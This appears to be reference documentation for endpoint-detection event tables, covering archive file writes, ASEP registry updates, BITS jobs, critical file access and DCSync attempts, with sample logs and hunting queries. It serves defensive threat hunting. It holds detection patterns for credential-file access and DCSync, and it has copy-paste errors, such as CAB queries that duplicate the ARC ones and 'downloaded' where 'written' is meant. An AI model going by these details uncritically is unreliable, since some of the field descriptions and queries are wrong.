## ArcFileWritten Table: File Written Event

### 1. Table Name
**ArcFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an ARC (Archive) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| TargetFileName      | The resulting file name that was written.                                          | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                       | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                    | Windows Only       |
| ContextBaseFileName | The base name of the context file.                                                 | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\report.zip",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-...",
  "ContextBaseFileName": "report.zip"
}
```

---
### 5. Example Queries
```xql
// Find all ARC files written with a specific target file name
event_simpleName=ArcFileWritten TargetFileName="*sensitive_data.zip*"

// Find ARC files written to a network drive (Windows only)
event_simpleName=ArcFileWritten IsOnNetwork=true

// Find ARC files written to a removable disk
event_simpleName=ArcFileWritten IsOnRemovableDisk=true

// Investigate ARC file writes by a specific file operator SID (Windows only)
event_simpleName=ArcFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find ARC files based on their context base file name
event_simpleName=ArcFileWritten ContextBaseFileName="archive.rar"
```

---
## ArjFileWritten Table: File Written Event

### 1. Table Name
**ArjFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an ARJ (Archive) file. It provides details about the file, the process involved, and its location, which is useful for investigations into file creation, data exfiltration, and malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\archive.arj",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-...",
  "ContextBaseFileName": "archive.arj"
}
```
---

### 5. Example Queries
```xql
// Find all ARJ files written with a specific target file name
event_simpleName=ArjFileWritten TargetFileName="*invoice.arj*"

// Find ARJ files written to a network drive (Windows only)
event_simpleName=ArjFileWritten IsOnNetwork=true

// Find ARJ files written to a removable disk
event_simpleName=ArjFileWritten IsOnRemovableDisk=true

// Investigate ARJ file writes by a specific file operator SID (Windows only)
event_simpleName=ArjFileWritten FileOperatorSid="S-1-5-21-98765-43210-*"

// Find ARJ files based on their context base file name
event_simpleName=ArjFileWritten ContextBaseFileName="backup.arj"
```

---
## AsepValueUpdate Table: ASEP Value Update Event

### 1. Table Name
**AsepValueUpdate**

---

### 2. Table Usage
This table records events where a Microsoft Auto Start Execution Point (ASEP) registry key is updated. This is critical for detecting persistence mechanisms, malware installation, or system configuration changes.

---

### 3. Important Parameter Description

| Parameter       | Description                                                                                                                                                                                                           | Platforms Affected |
|-----------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| RegObjectName   | The full path to the registry key object that was updated.                                                                                                                                                            | Windows Only       |
| RegType         | The data type of the registry value. Values include REG_SZ (string), REG_DWORD (32-bit number), REG_BINARY (binary data), etc.                                                                                       | Windows Only       |
| RegValueName    | The name of the registry value that was updated within the specified key.                                                                                                                                             | Windows Only       |
| RegOperationType| The type of registry operation performed (e.g., REG_SET_VALUE_KEY, REG_DELETE_VALUE_KEY, REG_CREATE_KEY).                                                                                                              | Windows Only       |
| AsepValueType   | The type of value found in the ASEP entry, indicating whether it's a DLL_PATH, DLL_NAME, APP_NAME, or GUID.                                                                                                           | Windows Only       |
| AsepClass       | The classification of the ASEP, such as SYSTEM_STARTUP_AUTORUN, USER_LOGON_AUTORUN, APP_START_AUTORUN, etc., indicating where the auto-start point resides.                                                           | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "RegObjectName": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
  "RegValueName": "MaliciousApp",
  "RegType": "REG_SZ",
  "RegOperationType": "REG_SET_VALUE_KEY",
  "AsepValueType": "APP_NAME",
  "AsepClass": "USER_LOGON_AUTORUN"
}
```

---

### 5. Example Queries

```xql
// Find all AsepValueUpdate events where a new application was added to Windows startup
event_simpleName=AsepValueUpdate RegObjectName="*\\Microsoft\\Windows\\CurrentVersion\\Run*" RegOperationType=REG_SET_VALUE_KEY AsepValueType=APP_NAME

// Investigate AsepValueUpdate events for changes to specific registry value names
event_simpleName=AsepValueUpdate RegValueName="PersistenceEntry"

// Detect AsepValueUpdate events related to DLL path modifications in auto-run locations
event_simpleName=AsepValueUpdate AsepValueType=DLL_PATH RegOperationType=REG_SET_VALUE_KEY

// Find AsepValueUpdate events for system startup autoruns
event_simpleName=AsepValueUpdate AsepClass=SYSTEM_STARTUP_AUTORUN

// Monitor for any AsepValueUpdate events that involve the deletion of a registry value
event_simpleName=AsepValueUpdate RegOperationType=REG_DELETE_VALUE_KEY
```

---
## BITSJobCreated Table: BITS Job Created Event

### 1. Table Name
**BITSJobCreated**

---

### 2. Table Usage
This table records events generated when a Background Intelligent Transfer Service (BITS) download job is created, typically indicating a file transfer operation initiated by an application or system component. This is useful for tracking file downloads, potential malware delivery, or data exfiltration attempts.

---

### 3. Important Parameter Description

| Parameter          | Description                                                                                  | Platforms Affected |
|--------------------|----------------------------------------------------------------------------------------------|--------------------|
| TargetFileName     | The resulting file name that was downloaded.                                         | Windows Only       |
| UserName           | The user name associated with the process creating the BITS job.                     | Windows Only       |
| RpcClientProcessId | The ProcessId corresponding to the RPC client of this request.                     | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\Public\\Downloads\\malware.exe",
  "UserName": "JOHN_DOE\\User",
  "RpcClientProcessId": "7890"
}
```

---
### 5. Example Queries
```xql
// Find all BITS job creation events that downloaded an executable file
event_simpleName=BITSJobCreated TargetFileName="*.exe*"

// Investigate BITS jobs created by a specific user
event_simpleName=BITSJobCreated UserName="JOHN_DOE\\User"

// Find BITS jobs initiated by a specific RPC client process ID
event_simpleName=BITSJobCreated RpcClientProcessId="7890"

// Combine queries to find suspicious BITS downloads by a specific user
event_simpleName=BITSJobCreated UserName="SUSPICIOUS_USER" TargetFileName="*temp\\*.dll*"
```
---
## BZip2FileWritten Table: BZip2 File Written Event

### 1. Table Name
**BZip2FileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a BZip2 file. BZip2 files are common compressed archive formats, and monitoring their creation can help detect data compression activities, exfiltration attempts, or malware packaging.

---

### 3. Important Parameter Description

| Parameter                  | Description                                                                                                                                                                                                                                                                                                 | Platforms Affected |
|----------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| ContextTimeStamp           | System time of event creation.                                                                                                                                                                                                                                                                    | All                |
| ContextProcessId           | UPID of process originating this event.                                                                                                                                                                                                                                                           | All                |
| ContextThreadId            | UTID of thread originating this event                                                                                                                                                                                                                                                             | All                |
| TreeId                     | If this event is part of a detection tree, the tree ID it is part of.                                                                                                                                                                                                                             | All                |
| FileIdentifier             |                                                                                                                                                                                                                                                                                                   | All                |
| TargetFileName             | The resulting file name that was downloaded                                                                                                                                                                                                                                                       | All                |
| IsOnRemovableDisk          | If true, it means this file was located on a removable disk.                                                                                                                                                                                                                                      | All                |
| UserName                   |                                                                                                                                                                                                                                                                                                   | All                |
| Size                       |                                                                                                                                                                                                                                                                                                   | All                |
| DiskParentDeviceInstanceId |                                                                                                                                                                                                                                                                                                   | All                |
| FileCategory               | Values: OTHER (0) ARCHIVES (1) OFFICE_DOCUMENTS (2) MULTIMEDIA_FILES (3) DESIGN_FILES (4) SOURCE_CODE (5) EXECUTABLE_FILES (6) VIRTUAL_MACHINE_FILES (7) EMAIL_FILES (8) DATA_AND_LOGS (9) ENCRYPTED (10)                                                                                          | All                |
| VolumeSessionUUID          |                                                                                                                                                                                                                                                                                                   | All                |
| FileSourcePath             |                                                                                                                                                                                                                                                                                                   | All                |
| MipInformation             |                                                                                                                                                                                                                                                                                                   | All                |
| SHA256HashData             | The SHA256 hash of a file. In most cases, the hash of the file referred to by the ImageFileName field. Values: STATIC_SHA256_DOPPELGANGING (0x56f3097c4d5bf4c7c ff ef168ee732e1c78f2ee62bc1c1ba61c219226bef619f8) STATIC_SHA256_SYSTEM (0x03312a19baa7ab137c09127c6feb58c05216a7880d3c9e6ae54a8bcda460f92a) | All                |
| ContextBaseFileName        |                                                                                                                                                                                                                                                                                                   | All                |
| IsOnNetwork                | Set to true if the relevant file listed in the event is on a network drive. False otherwise.                                                                                                                                                                                                    | Windows Only       |
| AuthenticationId           | Values: INVALID_LUID (0) SYSTEM (999) NETWORK_SERVICE (996) LOCAL_SERVICE (997) RESERVED_LUID_MAX (1000)                                                                                                                                                                                           | Windows Only       |
| TokenType                  | Values: INVALID_TOKEN (0) PRIMARY_TOKEN (1) IMPERSONATION_TOKEN (2)                                                                                                                                                                                                                               | Windows Only       |
| FileObject                 |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| MajorFunction              |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| MinorFunction              |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| IrpFlags                   |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| OperationFlags             |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| FileEcpBitmask             | Values: ECP_SRV_OPEN (0x00000001) ECP_CS_SENSOR_OPEN (0x00000002) ECP_CS_SENSOR_FILE_CHARACTERISTICS (0x00000004)                                                                                                                                                                                | Windows Only       |
| TemporaryFileName          | Values: HASH_IS_VALID (0x00000000) HASH_FAILED (0x00000001)                                                                                                                                                                                                                                       | Windows Only       |
| FileWrittenFlags           | HASH_ABORTED_TOO_LARGE (0x00000002) PAGING_WRITE (0x00000004)                                                                                                                                                                                                                                     | Windows Only       |
| FileOperatorSid            |                                                                                                                                                                                                                                                                                                   | Windows Only       |
| MountNamespaceUniqueId     |                                                                                                                                                                                                                                                                                                   | Linux Only         |
| RawProcessId               | The operating system's internal PID. For matching, use the UPID fields which guarantee a unique process identifier                                                                                                                                                                                | Linux Only         |
| RUID                       | The real UID for a unix style process.                                                                                                                                                                                                                                                            | Linux Only         |
| RGID                       | The real GID for a unix style process.                                                                                                                                                                                                                                                            | Linux Only         |
| FsMagic                    |                                                                                                                                                                                                                                                                                                   | Linux Only         |
| DeviceMountCounter         |                                                                                                                                                                                                                                                                                                   | Linux Only         |
| DeviceId                   |                                                                                                                                                                                                                                                                                                   | Linux Only         |
| FileSerialNumber           |                                                                                                                                                                                                                                                                                                   | Linux Only         |
| ChangeTime                 | Unix change time, indicating last status change or file modification. NOTE: This is the only timestamp which is not modifiable, unlike the other file timestamps.                                                                                                                                  | Linux Only         |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "1701388800000",
  "ContextProcessId": "12345",
  "ContextThreadId": "67890",
  "TreeId": "abc-123-def-456",
  "FileIdentifier": "123456789",
  "TargetFileName": "/home/user/documents/report.bz2",
  "IsOnRemovableDisk": false,
  "UserName": "testuser",
  "Size": 51200,
  "DiskParentDeviceInstanceId": "DEV-001",
  "FileCategory": "ARCHIVES",
  "VolumeSessionUUID": "vol-uuid-1",
  "FileSourcePath": "/tmp/source_data.txt",
  "MipInformation": "some_mip_info",
  "SHA256HashData": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
  "ContextBaseFileName": "report.bz2",
  "IsOnNetwork": false,
  "AuthenticationId": 999,
  "TokenType": "PRIMARY_TOKEN",
  "FileObject": "0x123abc",
  "MajorFunction": 1,
  "MinorFunction": 0,
  "IrpFlags": 0,
  "OperationFlags": 0,
  "FileEcpBitmask": "0x00000001",
  "TemporaryFileName": "temp_report.tmp",
  "FileWrittenFlags": "0x00000000",
  "FileOperatorSid": "S-1-5-21-12345-67890-..."
}
```
---
### 5. Example Queries
```xql
// Find all BZip2 files written on any platform
event_simpleName=BZip2FileWritten

// Find BZip2 files written to a removable disk
event_simpleName=BZip2FileWritten IsOnRemovableDisk=true

// Find BZip2 files written to a network drive (Windows only)
event_simpleName=BZip2FileWritten IsOnNetwork=true

// Investigate BZip2 file writes by a specific username
event_simpleName=BZip2FileWritten UserName="*malicious_user*"

// Find BZip2 files with a specific SHA256 hash
event_simpleName=BZip2FileWritten SHA256HashData="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"

// Find BZip2 files categorized as archives and created by a specific process ID
event_simpleName=BZip2FileWritten FileCategory=ARCHIVES ContextProcessId="12345"
```
---
## BlfFileWritten Table: BLF File Written Event

### 1. Table Name
**BlfFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a BLF (Binary Log File) file. These files are often used for logging system events or driver information. Monitoring this event can help identify suspicious logging activities, data manipulation, or system component compromise.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| ContextBaseFileName | The base name of the context file that was written.                                | All                |
| TargetFileName      | The resulting file name that was written.                                                    | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                                 | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                              | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "sys_log.blf",
  "TargetFileName": "C:\\Windows\\System32\\config\\sys_log.blf",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-18"
}
```
---
### 5. Example Queries

```xql
// Find all BLF files written to a network drive (Windows only)
event_simpleName=BlfFileWritten IsOnNetwork=true

// Find BLF files written to a removable disk
event_simpleName=BlfFileWritten IsOnRemovableDisk=true

// Investigate BLF file writes by a specific file operator SID (Windows only)
event_simpleName=BlfFileWritten FileOperatorSid="S-1-5-18"

// Find BLF files with a specific target file name
event_simpleName=BlfFileWritten TargetFileName="*temp_update.blf*"

// Find BLF files based on their context base file name
event_simpleName=BlfFileWritten ContextBaseFileName="diagnostic.blf"
```
---
## BmpFileWritten Table: BMP File Written Event

### 1. Table Name
**BmpFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a BMP (Bitmap) image file. Monitoring these events can be useful for tracking image generation, potential data manipulation, or the creation of visual artifacts by applications.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| ContextBaseFileName | The base name of the context file that was written.                                | All                |
| TargetFileName      | The resulting file name that was written.                                                    | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                                 | All                |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                              | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "new_drawing.bmp",
  "TargetFileName": "C:\\Users\\Public\\Pictures\\new_drawing.bmp",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-9876543210-..."
}
```
---
### 5. Example Queries
```xql
// Find all BMP files written to a network drive (Windows only)
event_simpleName=BmpFileWritten IsOnNetwork=true

// Find BMP files written to a removable disk
event_simpleName=BmpFileWritten IsOnRemovableDisk=true

// Investigate BMP file writes by a specific file operator SID (Windows only)
event_simpleName=BmpFileWritten FileOperatorSid="S-1-5-21-9876543210-*"

// Find BMP files with a specific target file name
event_simpleName=BmpFileWritten TargetFileName="*screenshot.bmp*"

// Find BMP files based on their context base file name
event_simpleName=BmpFileWritten ContextBaseFileName="wallpaper.bmp"
```
---
## CabFileWritten Table: CAB File Written Event

### 1. Table Name
**CabFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Microsoft Cabinet (CAB) file. CAB files are commonly used for software distribution and compression. Monitoring their creation can help identify legitimate software installations, as well as potential malware packaging or data exfiltration attempts.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file that was written. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |
| FileOperatorSid | Security Identifier (SID) of the file operator. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "installer.cab",
  "TargetFileName": "C:\\Windows\\Temp\\installer.cab",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-18"
}
```
---
### 5. Example Queries
```xql
// Find all ARC files written with a specific target file name
event_simpleName=ArcFileWritten TargetFileName="*sensitive_data.zip*"

// Find ARC files written to a network drive (Windows only)
event_simpleName=ArcFileWritten IsOnNetwork=true

// Find ARC files written to a removable disk
event_simpleName=ArcFileWritten IsOnRemovableDisk=true

// Investigate ARC file writes by a specific file operator SID (Windows only)
event_simpleName=ArcFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find ARC files based on their context base file name
event_simpleName=ArcFileWritten ContextBaseFileName="archive.rar"
```
---
## ClassifiedModuleLoad Table: Classified Module Load Event

### 1. Table Name
**ClassifiedModuleLoad**

---

### 2. Table Usage
The ClassifiedModuleLoad event provides information about a module which has been loaded into a process's memory space. It is only generated for 'classified' module loads, that is module loads that are interesting enough for us to cloud.

---

### 3. Important Parameter Description

| Parameter         | Description                                                          | Platforms Affected |
|-------------------|----------------------------------------------------------------------|--------------------|
| TargetFileName    | The full path to the executable file for the target process.         | All                |
| IsOnNetwork       | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk.         | Windows Only       |
| FileOperatorSid   | Security Identifier (SID) of the file operator.                      | Windows Only       |
| ContextBaseFileName | The base name of the context file.                                   | All                |

---
### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Windows\\System32\\example.dll",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-...",
  "ContextBaseFileName": "example.dll"
}
```
---
### 5. Example Queries
```xql
// Find all classified module loads for a specific target file name
event_simpleName=ClassifiedModuleLoad TargetFileName="*example.dll*"

// Find classified module loads from a network drive (Windows only)
event_simpleName=ClassifiedModuleLoad IsOnNetwork=true

// Find classified module loads from a removable disk (Windows only)
event_simpleName=ClassifiedModuleLoad IsOnRemovableDisk=true

// Investigate classified module loads by a specific file operator SID (Windows only)
event_simpleName=ClassifiedModuleLoad FileOperatorSid="S-1-5-21-12345-67890-*"

// Find classified module loads based on their context base file name
event_simpleName=ClassifiedModuleLoad ContextBaseFileName="module.dll"
```
---
## CommandHistory Table: Command History Event

### 1. Table Name
**CommandHistory**

---

### 2. Table Usage
This event includes the full command history associated with one of the consoles in a process that has recently terminated (identified by the TargetProcessId). Note that a given UPID may be associated with multiple consoles (identified by ApplicationName).

---

### 3. Important Parameter Description

| Parameter       | Description                                                                                                                                                                                                                                                                                                              |
|-----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| TargetProcessId | The unique ID of a target process (in decimal, non-hex format). This field exists in almost all events, and it represents the ID of the process that is responsible for the activity of the event in focus. For example, the TargetProcessId of a process that performed thread injection in an InjectedThread event |
| CommandHistory  | The full command history associated with one of the consoles in a process.                                                                                                                                                                                                                                     |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": 12345,
  "ApplicationName": "cmd.exe",
  "CommandCount": 5,
  "CommandCountMax": 50,
  "FirstCommand": "cd C:\\Users\\user\\Documents",
  "LastAdded": "dir",
  "LastDisplayed": "dir",
  "CommandHistory": [
    "cd C:\\Users\\user\\Documents",
    "mkdir NewFolder",
    "echo Hello > NewFolder\\file.txt",
    "type NewFolder\\file.txt",
    "dir"
  ],
  "CommandSequence": 5,
  "UserSid": "S-1-5-21-...",
  "LogonType": 2,
  "LogonTime": "2023-10-27T10:00:00Z",
  "AuthenticationId": 999
}
```
---
### 5. Example Queries
```xql
// Find command history for a specific target process ID
event_simpleName=CommandHistory TargetProcessId=12345

// Find command history containing a specific command
event_simpleName=CommandHistory CommandHistory="*powershell*"
```
---
## CreateService Table: Service Creation Event

### 1. Table Name
**CreateService**

---

### 2. Table Usage
Generated when a Windows service is created.

---

### 3. Important Parameter Description

| Parameter         | Description                                                                                                                                                                                                          |
|-------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| ServiceDisplayName | The display name of the service.                                                                                                                                                                                     |
| ServiceImagePath  | The path to the service binary.                                                                                                                                                                                      |
| ServiceType       | The type of service. Values: SERVICE_KERNEL_DRIVER (1) SERVICE_FILE_SYSTEM_DRIVER (2) SERVICE_ADAPTER (4) SERVICE_RECOGNIZER_DRIVER (8) SERVICE_WIN32_OWN_PROCESS (16) SERVICE_WIN32_SHARE_PROCESS (32) SERVICE_INTERACTIVE_PROCESS (256) |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 1234,
  "ContextThreadId": 5678,
  "TreeId": "abc-123",
  "ServiceStart": 2,
  "ServiceErrorControl": 1,
  "ServiceType": 16,
  "ServiceGroup": "",
  "ServiceImagePath": "C:\\Windows\\System32\\myservice.exe",
  "ServiceDisplayName": "My Custom Service"
}
```
---
### 5. Example Queries
```xql
// Find all created services with a specific display name
event_simpleName=CreateService ServiceDisplayName="My Custom Service"

// Find services created with a specific image path
event_simpleName=CreateService ServiceImagePath="C:\\Program Files\\MyApplication\\service.exe"

// Find services of a specific type (e.g., SERVICE_WIN32_OWN_PROCESS)
event_simpleName=CreateService ServiceType=16
```
---
## CriticalEnvironmentVariableChanged Table: Critical Environment Variable Changed Event

### 1. Table Name
**CriticalEnvironmentVariableChanged**

---

### 2. Table Usage
A process set a critical environment variable.

---

### 3. Important Parameter Description

| Parameter                | Description                                       | Platforms Affected |
|--------------------------|---------------------------------------------------|--------------------|
| EnvironmentVariableName  | The name of the environment variable that was set. | Linux, Falcon Container |
| EnvironmentVariableValue | The value to which the environment variable was set. | Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 12345,
  "ContextThreadId": 67890,
  "TreeId": "someTreeId",
  "EnvironmentVariableName": "PATH",
  "EnvironmentVariableValue": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/new/custom/path"
}
```
---
### 5. Example Queries
```xql
// Find all critical environment variable changes for a specific variable name
event_simpleName=CriticalEnvironmentVariableChanged EnvironmentVariableName="PATH"

// Find critical environment variable changes where the value contains a specific string
event_simpleName=CriticalEnvironmentVariableChanged EnvironmentVariableValue="*new/custom/path*"
```
---
## CriticalFileAccessed Table: Critical File Accessed Event

### 1. Table Name
**CriticalFileAccessed**

---

### 2. Table Usage
A critical file was accessed.

---

### 3. Important Parameter Description

| Parameter          | Description                                                                 | Platforms Affected         |
|--------------------|-----------------------------------------------------------------------------|----------------------------|
| ContextTimeStamp   | System time of event creation.                                    | macOS, Linux, Falcon Container |
| ContextProcessId   | UPID of process originating this event.                           | macOS, Linux, Falcon Container |
| ContextThreadId    | UTID of thread originating this event                             | macOS, Linux, Falcon Container |
| TreeId             | If this event is part of a detection tree, the tree ID it is part of. | macOS, Linux, Falcon Container |
| TargetFileName     | The resulting file name that was downloaded                       | macOS, Linux, Falcon Container |
| UID                | Unix User Identifier.                                             | macOS, Linux, Falcon Container |
| GID                | Unix Group Identifier.                                            | macOS, Linux, Falcon Container |
| UnixMode           | Describes the traditional Unix permissions of a file system entry (eg. 0755). | macOS, Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 12345,
  "ContextThreadId": 67890,
  "TreeId": "someTreeId",
  "TargetFileName": "/etc/passwd",
  "UID": 0,
  "GID": 0,
  "UnixMode": "0644"
}
```
---
### 5. Example Queries
```xql
// Find all critical file access events for a specific target file name
event_simpleName=CriticalFileAccessed TargetFileName="/etc/shadow"

// Find critical file access events by a specific UID
event_simpleName=CriticalFileAccessed UID=0

// Find critical file access events with a specific Unix mode
event_simpleName=CriticalFileAccessed UnixMode="0777"

// Investigate critical file access events part of a specific detection tree
event_simpleName=CriticalFileAccessed TreeId="abc-xyz"
```
---
## CriticalFileModified Table: Critical File Modified Event

### 1. Table Name
**CriticalFileModified**

---

### 2. Table Usage
A critical file was modified.

---

### 3. Important Parameter Description

| Parameter      | Description                               | Platforms Affected         |
|----------------|-------------------------------------------|----------------------------|
| TargetFileName | The resulting file name that was downloaded | macOS, Linux, Falcon Container |
| UID            | Unix User Identifier.                     | macOS, Linux, Falcon Container |
| GID            | Unix Group Identifier.                    | macOS, Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ContextProcessId": 12345,
  "ContextThreadId": 67890,
  "TreeId": "someTreeId",
  "TargetFileName": "/etc/hosts",
  "UID": 0,
  "GID": 0,
  "UnixMode": "0644"
}
```
---

### 5. Example Queries
```xql
// Find all critical file modification events for a specific target file name
event_simpleName=CriticalFileModified TargetFileName="/etc/resolv.conf"

// Find critical file modification events by a specific UID
event_simpleName=CriticalFileModified UID=0

// Find critical file modification events by a specific GID
event_simpleName=CriticalFileModified GID=0
```
---
## CrxFileWritten Table: CRX File Written Event

### 1. Table Name
**CrxFileWritten**

---

### 2. Table Usage
This event indicates when a CRX (Chrome Extension) file has been written to disk. It's useful for tracking potential browser compromise or unauthorized extension installations.

---

### 3. Important Parameter Description

| Parameter           | Description                                                                                  | Platforms Affected |
|---------------------|----------------------------------------------------------------------------------------------|--------------------|
| TargetFileName      | The resulting file name that was written.                                                    | All                |
| IsOnNetwork         | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows Only       |
| IsOnRemovableDisk   | If true, it means this file was located on a removable disk.                                 | Windows Only       |
| FileOperatorSid     | Security Identifier (SID) of the file operator.                                            | Windows Only       |
| ContextBaseFileName | The base name of the context file.                                                         | All                |
| UserName            | The name of the user associated with the event.                                              | All                |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\extension.crx",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-...",
  "ContextBaseFileName": "extension.crx",
  "UserName": "johndoe"
}
```
---
### 5. Example Queries
```xql
// Find all CRX files written with a specific target file name
event_simpleName=CrxFileWritten TargetFileName="*malicious_extension.crx*"

// Find CRX files written to a network drive (Windows only)
event_simpleName=CrxFileWritten IsOnNetwork=true

// Find CRX files written to a removable disk (Windows only)
event_simpleName=CrxFileWritten IsOnRemovableDisk=true

// Investigate CRX file writes by a specific file operator SID (Windows only)
event_simpleName=CrxFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find CRX files based on their context base file name
event_simpleName=CrxFileWritten ContextBaseFileName="adblock.crx"

// Find CRX files written by a specific user
event_simpleName=CrxFileWritten UserName="johndoe"
```
---
## DCSyncAttempted Table: DCSync Attempted Event

### 1. Table Name
**DCSyncAttempted**

---

### 2. Table Usage
This event indicates that Directory Services changes were replicated. If the source host is not a Domain Controller, this could represent malicious activity, specifically a DCSync attack.

---

### 3. Important Parameter Description

| Parameter            | Description                                                               | Platforms Affected |
|----------------------|---------------------------------------------------------------------------|--------------------|
| SubjectDomainNameEtw | The domain name of the subject involved in the replication attempt.       | Windows Only       |
| UserName             | The name of the user attempting the DCSync operation.                     | Windows Only       |
| RemoteAddressIP4     | The IPv4 address of the remote machine involved in the replication.       | Windows Only       |
| RemoteAddressIP6     | The IPv6 address of the remote machine involved in the replication.       | Windows Only       |

---

### 4. Sample Log Example

```json
{
  "EtwRawProcessId": 1234,
  "UserSid": "S-1-5-21-...",
  "UserName": "attacker_user",
  "AuthenticationId": 999,
  "SubjectDomainNameEtw": "corp.example.com",
  "ServiceAccessPropertiesEtw": {},
  "ObjectTypeEtw": "domain",
  "ObjectNameEtw": "DC01",
  "ClientComputerName": "ATTACKER-PC",
  "RemoteAddressIP4": "192.168.1.100",
  "RemoteAddressIP6": "::1",
  "ContextProcessId": 5678,
  "ContextTimeStamp": "2023-10-27T10:00:00Z",
  "ProcessStartKey": "someKey"
}
```
---
### 5. Example Queries
```xql
// Find all DCSync attempts by a specific user
event_simpleName=DCSyncAttempted UserName="attacker_user"

// Find DCSync attempts from a specific remote IPv4 address
event_simpleName=DCSyncAttempted RemoteAddressIP4="192.168.1.100"

// Find DCSync attempts targeting a specific domain
event_simpleName=DCSyncAttempted SubjectDomainNameEtw="corp.example.com"

// Identify DCSync attempts where the UserName is not a known Domain Controller account
event_simpleName=DCSyncAttempted event_simpleName=DCSyncAttempted NOT UserName IN ("DC01$", "DC02$")
```
---
## DebFileWritten Table: Deb File Written Event

### 1. Table Name
**DebFileWritten**

---

### 2. Table Usage
